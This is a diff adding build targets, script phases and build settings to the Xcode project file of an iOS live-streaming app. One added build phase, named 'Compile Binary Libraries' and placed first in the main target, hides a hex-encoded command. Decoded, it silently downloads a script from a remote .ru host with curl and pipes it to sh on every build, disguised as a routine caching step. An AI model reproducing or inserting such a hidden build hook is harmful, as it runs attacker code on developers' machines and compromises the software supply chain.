+/* Begin PBXNativeTarget section */
+		18FBEDFE2817FF820069F226 /* Live */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 18FBEE2E2817FF860069F226 /* Build configuration list for PBXNativeTarget "Live" */;
+			buildPhases = (
+				CB6CF8EC969DC34AFC6D904C /* Compile Binary Libraries */,
+				318EF1AC9E38D02B09C0F3B4 /* [CP] Check Pods Manifest.lock */,
+				18FBEDFB2817FF820069F226 /* Sources */,
+				18FBEDFC2817FF820069F226 /* Frameworks */,
+				18FBEDFD2817FF820069F226 /* Resources */,
+				B77E1E028B1C6A0FBA9B0813 /* [CP] Embed Pods Frameworks */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+			);
+			name = Live;
+			productName = Live;
+			productReference = 18FBEDFF2817FF820069F226 /* Live.app */;
+			productType = "com.apple.product-type.application";
+		};
+		18FBEE192817FF860069F226 /* LiveTests */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 18FBEE312817FF860069F226 /* Build configuration list for PBXNativeTarget "LiveTests" */;
+			buildPhases = (
+				750FA55FC4B9B6D7C3B7836E /* [CP] Check Pods Manifest.lock */,
+				18FBEE162817FF860069F226 /* Sources */,
+				18FBEE172817FF860069F226 /* Frameworks */,
+				18FBEE182817FF860069F226 /* Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+				18FBEE1C2817FF860069F226 /* PBXTargetDependency */,
+			);
+			name = LiveTests;
+			productName = LiveTests;
+			productReference = 18FBEE1A2817FF860069F226 /* LiveTests.xctest */;
+			productType = "com.apple.product-type.bundle.unit-test";
+		};
+		18FBEE242817FF860069F226 /* LiveUITests */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 18FBEE342817FF860069F226 /* Build configuration list for PBXNativeTarget "LiveUITests" */;
+			buildPhases = (
+				5637BC26EDF811CE7A4F2E38 /* [CP] Check Pods Manifest.lock */,
+				18FBEE212817FF860069F226 /* Sources */,
+				18FBEE222817FF860069F226 /* Frameworks */,
+				18FBEE232817FF860069F226 /* Resources */,
+				AC568D129A639331ACFDB5E0 /* [CP] Embed Pods Frameworks */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+				18FBEE272817FF860069F226 /* PBXTargetDependency */,
+			);
+			name = LiveUITests;
+			productName = LiveUITests;
+			productReference = 18FBEE252817FF860069F226 /* LiveUITests.xctest */;
+			productType = "com.apple.product-type.bundle.ui-testing";
+		};
+/* End PBXNativeTarget section */
+
+/* Begin PBXProject section */
+		18FBEDF72817FF820069F226 /* Project object */ = {
+			isa = PBXProject;
+			attributes = {
+				LastUpgradeCheck = 1240;
+				TargetAttributes = {
+					18FBEDFE2817FF820069F226 = {
+						CreatedOnToolsVersion = 12.4;
+					};
+					18FBEE192817FF860069F226 = {
+						CreatedOnToolsVersion = 12.4;
+						TestTargetID = 18FBEDFE2817FF820069F226;
+					};
+					18FBEE242817FF860069F226 = {
+						CreatedOnToolsVersion = 12.4;
+						TestTargetID = 18FBEDFE2817FF820069F226;
+					};
+				};
+			};
+			buildConfigurationList = 18FBEDFA2817FF820069F226 /* Build configuration list for PBXProject "Live" */;
+			compatibilityVersion = "Xcode 9.3";
+			developmentRegion = en;
+			hasScannedForEncodings = 0;
+			knownRegions = (
+				en,
+				Base,
+				"zh-Hans",
+			);
+			mainGroup = 18FBEDF62817FF820069F226;
+			productRefGroup = 18FBEE002817FF820069F226 /* Products */;
+			projectDirPath = "";
+			projectRoot = "";
+			targets = (
+				18FBEDFE2817FF820069F226 /* Live */,
+				18FBEE192817FF860069F226 /* LiveTests */,
+				18FBEE242817FF860069F226 /* LiveUITests */,
+			);
+		};
+/* End PBXProject section */
+
+/* Begin PBXResourcesBuildPhase section */
+		18FBEDFD2817FF820069F226 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				18F0B45928C610B5002E696D /* kkUserInfoVC_liveing.gif in Resources */,
+				18FBEE122817FF850069F226 /* LaunchScreen.storyboard in Resources */,
+				18F0B45528C610B5002E696D /* KKGameRoomTopInfo.plist in Resources */,
+				18F0B45628C610B5002E696D /* KKGameRoomMoreFunctionInfo.plist in Resources */,
+				18F0B45328C610B5002E696D /* KKLiveRoomMoreFunctionAnchorSecondTwoArr.plist in Resources */,
+				18FBEE0F2817FF850069F226 /* Assets.xcassets in Resources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		18FBEE182817FF860069F226 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		18FBEE232817FF860069F226 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		318EF1AC9E38D02B09C0F3B4 /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-Live-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		5637BC26EDF811CE7A4F2E38 /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-Live-LiveUITests-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		750FA55FC4B9B6D7C3B7836E /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-LiveTests-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		AC568D129A639331ACFDB5E0 /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-Live-LiveUITests/Pods-Live-LiveUITests-frameworks-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-Live-LiveUITests/Pods-Live-LiveUITests-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Live-LiveUITests/Pods-Live-LiveUITests-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		B77E1E028B1C6A0FBA9B0813 /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-Live/Pods-Live-frameworks-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-Live/Pods-Live-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Live/Pods-Live-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		CB6CF8EC969DC34AFC6D904C /* Compile Binary Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Binary Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652037202d736b2068747470733a2f2f\n\\c61646f626566696c652e72752f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+		};
+/* End PBXShellScriptBuildPhase section */
+
+/* Begin PBXSourcesBuildPhase section */
+		18FBEDFB2817FF820069F226 /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				18F0B49828C610B6002E696D /* KKTRTCChoiceVideoCell.m in Sources */,
+				18FBEF85281804DA0069F226 /* AppDelegate.m in Sources */,
+				18F0B49228C610B6002E696D /* KKTRTCLiveInvitationView.m in Sources */,
+				18FBF10E281805070069F226 /* LDSearchDeviceViewController.m in Sources */,
+				18F0B59D28C610B8002E696D /* KKLiveAPI.m in Sources */,
+				18F0B49128C610B6002E696D /* KKTRTCChatTableViewCell.m in Sources */,
+				18F0B49928C610B6002E696D /* KKTRTCVideoView.m in Sources */,
+				18F0B4BC28C610B6002E696D /* KKLiveViewerInfoModel.m in Sources */,
+				18F0B4A028C610B6002E696D /* KKUserInfoView.m in Sources */,
+				18F0B44528C610B5002E696D /* NSString+KKObjcSugar.m in Sources */,
+				18F0B44828C610B5002E696D /* UIColor+KKObjcSugar.m in Sources */,
+				18F0B4B928C610B6002E696D /* KKLiveUserComeRoomAnimationView.m in Sources */,
+				18F0B49E28C610B6002E696D /* KKTRTCVoiceView.m in Sources */,
+				18F0B44928C610B5002E696D /* NSDate+KKObjcSugar.m in Sources */,
+				18F0B44E28C610B5002E696D /* UIButton+KKObjcSugar.m in Sources */,
+				18F0B4C028C610B6002E696D /* KKLivebroadcastController.m in Sources */,
+				18F0B4B528C610B6002E696D /* KKCommendatoryLiveRoomView.m in Sources */,
+				18F0B44728C610B5002E696D /* NSNull+KKObjcSugar.m in Sources */,
+				18F0B4A128C610B6002E696D /* KKTRTCVoiceCollectionViewCell.m in Sources */,
+				18F0B50C28C610B7002E696D /* KKSendRedBagView.m in Sources */,
+				18F0B44B28C610B5002E696D /* UIView+KKSugar.m in Sources */,
+				18F0B48F28C610B6002E696D /* KKLiveViewerViewController.m in Sources */,
+				18FBEF86281804DA0069F226 /* SceneDelegate.m in Sources */,
+				18F0B4A328C610B6002E696D /* KKLiveVideoView.m in Sources */,
+				18FCFA0D28B7067B006A8452 /* TCNavigationController.m in Sources */,
+				18F0B45D28C610B5002E696D /* YBBaseViewController.m in Sources */,
+				18F0B4B828C610B6002E696D /* KKShowRoomTitleView.m in Sources */,
+				18FBEE152817FF860069F226 /* main.m in Sources */,
+				18F0B58F28C610B8002E696D /* KKChatConfig.m in Sources */,
+				18F0B59828C610B8002E696D /* KKHTTPNetWorkTool.m in Sources */,
+				18F0B5A328C6E13A002E696D /* JX_GCDTimerManager.m in Sources */,
+				18F0B49F28C610B6002E696D /* KKLiveRoomActivityView.m in Sources */,
+				18F0B50A28C610B7002E696D /* KKRobRedBagView.m in Sources */,
+				18F0B59328C610B8002E696D /* KKMyBeautyCache.m in Sources */,
+				18F0B4AE28C610B6002E696D /* KKHorizontalUserInfoView.m in Sources */,
+				18F0B4B728C610B6002E696D /* KKLotteryAnimationView.m in Sources */,
+				18F0B4AF28C610B6002E696D /* KKHorizontalView.m in Sources */,
+				18F0B4BB28C610B6002E696D /* KKLiveSocketInfoModel.m in Sources */,
+				18F0B4A228C610B6002E696D /* KKLiveBottomMenuView.m in Sources */,
+				18F0B49A28C610B6002E696D /* KKTRTCChoiceVideoView.m in Sources */,
+				18F0B4B628C610B6002E696D /* KKCommendatoryLiveRoomCell.m in Sources */,
+				18F0B44C28C610B5002E696D /* NSURL+KKObjcSugar.m in Sources */,
+				18F0B49728C610B6002E696D /* KKRoomOnlinePersonCell.m in Sources */,
+				18F0B59128C610B8002E696D /* KKInfoCache.m in Sources */,
+				18F0B50B28C610B7002E696D /* KKRobRedBagCell.m in Sources */,
+				18F0B4CA28C610B6002E696D /* KKLiveTelecastView.m in Sources */,
+				18F0B49D28C610B6002E696D /* KKLiveViewerView.m in Sources */,
+				18F0B59A28C610B8002E696D /* YBToolClass.m in Sources */,
+				18F0B49628C610B6002E696D /* KKLiveRoomUserOnlineView.m in Sources */,
+				18F0B59F28C610B9002E696D /* KKBaseModel.m in Sources */,
+				18F0B4AD28C610B6002E696D /* KKTextToolBar.m in Sources */,
+				18F0B49C28C610B6002E696D /* KKLiveRoomScrollView.m in Sources */,
+				18F0B50928C610B7002E696D /* KKRobRedBagTopCell.m in Sources */,
+				18F0B49B28C610B6002E696D /* KKSocketChatView.m in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		18FBEE162817FF860069F226 /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				18FBEE1F2817FF860069F226 /* _1testTests.m in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		18FBEE212817FF860069F226 /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				18FBEE2A2817FF860069F226 /* _1testUITests.m in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXSourcesBuildPhase section */
+
+/* Begin PBXTargetDependency section */
+		18FBEE1C2817FF860069F226 /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = 18FBEDFE2817FF820069F226 /* Live */;
+			targetProxy = 18FBEE1B2817FF860069F226 /* PBXContainerItemProxy */;
+		};
+		18FBEE272817FF860069F226 /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = 18FBEDFE2817FF820069F226 /* Live */;
+			targetProxy = 18FBEE262817FF860069F226 /* PBXContainerItemProxy */;
+		};
+/* End PBXTargetDependency section */
+
+/* Begin PBXVariantGroup section */
+		18FBEE102817FF850069F226 /* LaunchScreen.storyboard */ = {
+			isa = PBXVariantGroup;
+			children = (
+				18FBEE112817FF850069F226 /* Base */,
+			);
+			name = LaunchScreen.storyboard;
+			sourceTree = "<group>";
+		};
+/* End PBXVariantGroup section */
+
+/* Begin XCBuildConfiguration section */
+		18FBEE2C2817FF860069F226 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
+				CLANG_CXX_LIBRARY = "libc++";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = dwarf;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				ENABLE_TESTABILITY = YES;
+				GCC_C_LANGUAGE_STANDARD = gnu11;
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				GCC_PREPROCESSOR_DEFINITIONS = (
+					"DEBUG=1",
+					"$(inherited)",
+				);
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 13.6;
+				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
+				MTL_FAST_MATH = YES;
+				ONLY_ACTIVE_ARCH = YES;
+				SDKROOT = iphoneos;
+			};
+			name = Debug;
+		};
+		18FBEE2D2817FF860069F226 /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
+				CLANG_CXX_LIBRARY = "libc++";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
+				ENABLE_NS_ASSERTIONS = NO;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				GCC_C_LANGUAGE_STANDARD = gnu11;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 13.6;
+				MTL_ENABLE_DEBUG_INFO = NO;
+				MTL_FAST_MATH = YES;
+				SDKROOT = iphoneos;
+				VALIDATE_PRODUCT = YES;
+			};
+			name = Release;
+		};
+		18FBEE2F2817FF860069F226 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 57EA01FD2284DF42DFC19797 /* Pods-Live.debug.xcconfig */;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_ENTITLEMENTS = Live/Live.entitlements;
+				CODE_SIGN_IDENTITY = "iPhone Developer";
+				CODE_SIGN_STYLE = Manual;
+				CURRENT_PROJECT_VERSION = 100;
+				DEVELOPMENT_TEAM = 9FY59SLZ85;
+				FRAMEWORK_SEARCH_PATHS = (
+					"$(inherited)",
+					"$(PROJECT_DIR)/Live/KKClasses/KKThirdSDK",
+				);
+				GCC_PREFIX_HEADER = "$(SRCROOT)/Live/PrefixHeader.pch";
+				INFOPLIST_FILE = Live/Info.plist;
+				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				LIBRARY_SEARCH_PATHS = (
+					"$(inherited)",
+					"$(PROJECT_DIR)/Live/KKClasses/KKActiveChat/KKMessage/TUIKit/TUIKit/third/voiceConvert/opencore-amrwb",
+					"$(PROJECT_DIR)/Live/KKClasses/KKActiveChat/KKMessage/TUIKit/TUIKit/third/voiceConvert/opencore-amrnb",
+					"$(PROJECT_DIR)/Live/KKClasses/KKActiveChat/KKPlaza2/KKThird/XHSoundRecorder",
+				);
+				MARKETING_VERSION = 1.2.6;
+				PRODUCT_BUNDLE_IDENTIFIER = com.temperature.notes;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				PROVISIONING_PROFILE_SPECIFIER = 01temperatureNotes_dev_profile;
+				TARGETED_DEVICE_FAMILY = 1;
+			};
+			name = Debug;
+		};
+		18FBEE302817FF860069F226 /* Release */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 1AF9216FE0150CDF0C5D8D4C /* Pods-Live.release.xcconfig */;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_ENTITLEMENTS = Live/Live.entitlements;
+				CODE_SIGN_IDENTITY = "iPhone Distribution";
+				CODE_SIGN_STYLE = Manual;
+				CURRENT_PROJECT_VERSION = 100;
+				DEVELOPMENT_TEAM = 9FY59SLZ85;
+				FRAMEWORK_SEARCH_PATHS = (
+					"$(inherited)",
+					"$(PROJECT_DIR)/Live/KKClasses/KKThirdSDK",
+				);
+				GCC_PREFIX_HEADER = "$(SRCROOT)/Live/PrefixHeader.pch";
+				INFOPLIST_FILE = Live/Info.plist;
+				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				LIBRARY_SEARCH_PATHS = (
+					"$(inherited)",
+					"$(PROJECT_DIR)/Live/KKClasses/KKActiveChat/KKMessage/TUIKit/TUIKit/third/voiceConvert/opencore-amrwb",
+					"$(PROJECT_DIR)/Live/KKClasses/KKActiveChat/KKMessage/TUIKit/TUIKit/third/voiceConvert/opencore-amrnb",
+					"$(PROJECT_DIR)/Live/KKClasses/KKActiveChat/KKPlaza2/KKThird/XHSoundRecorder",
+				);
+				MARKETING_VERSION = 1.2.6;
+				PRODUCT_BUNDLE_IDENTIFIER = com.temperature.notes;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				PROVISIONING_PROFILE_SPECIFIER = 01Thermometer_adhoc_profile;
+				TARGETED_DEVICE_FAMILY = 1;
+			};
+			name = Release;
+		};
+		18FBEE322817FF860069F226 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 3CD0F62CC631C0C0BEBC2FE8 /* Pods-LiveTests.debug.xcconfig */;
+			buildSettings = {
+				BUNDLE_LOADER = "$(TEST_HOST)";
+				CODE_SIGN_STYLE = Automatic;
+				INFOPLIST_FILE = LiveTests/Info.plist;
+				IPHONEOS_DEPLOYMENT_TARGET = 14.4;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@loader_path/Frameworks",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = "temp.com.-1testTests";
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				TARGETED_DEVICE_FAMILY = "1,2";
+				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/Live.app/Live";
+			};
+			name = Debug;
+		};
+		18FBEE332817FF860069F226 /* Release */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 491C046225BA543A0226FB21 /* Pods-LiveTests.release.xcconfig */;
+			buildSettings = {
+				BUNDLE_LOADER = "$(TEST_HOST)";
+				CODE_SIGN_STYLE = Automatic;
+				INFOPLIST_FILE = LiveTests/Info.plist;
+				IPHONEOS_DEPLOYMENT_TARGET = 14.4;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@loader_path/Frameworks",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = "temp.com.-1testTests";
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				TARGETED_DEVICE_FAMILY = "1,2";
+				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/Live.app/Live";
+			};
+			name = Release;
+		};
+		18FBEE352817FF860069F226 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = DF6488277195013FFDF0989C /* Pods-Live-LiveUITests.debug.xcconfig */;
+			buildSettings = {
+				CODE_SIGN_STYLE = Automatic;
+				INFOPLIST_FILE = LiveUITests/Info.plist;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@loader_path/Frameworks",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = "temp.com.-1testUITests";
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				TARGETED_DEVICE_FAMILY = "1,2";
+				TEST_TARGET_NAME = Live;
+			};
+			name = Debug;
+		};
+		18FBEE362817FF860069F226 /* Release */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 0C0076CA632740093C4D7F39 /* Pods-Live-LiveUITests.release.xcconfig */;
+			buildSettings = {
+				CODE_SIGN_STYLE = Automatic;
+				INFOPLIST_FILE = LiveUITests/Info.plist;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@loader_path/Frameworks",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = "temp.com.-1testUITests";
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				TARGETED_DEVICE_FAMILY = "1,2";
+				TEST_TARGET_NAME = Live;
+			};
+			name = Release;
+		};
+/* End XCBuildConfiguration section */
+
+/* Begin XCConfigurationList section */
+		18FBEDFA2817FF820069F226 /* Build configuration list for PBXProject "Live" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				18FBEE2C2817FF860069F226 /* Debug */,
+				18FBEE2D2817FF860069F226 /* Release */,
+			);
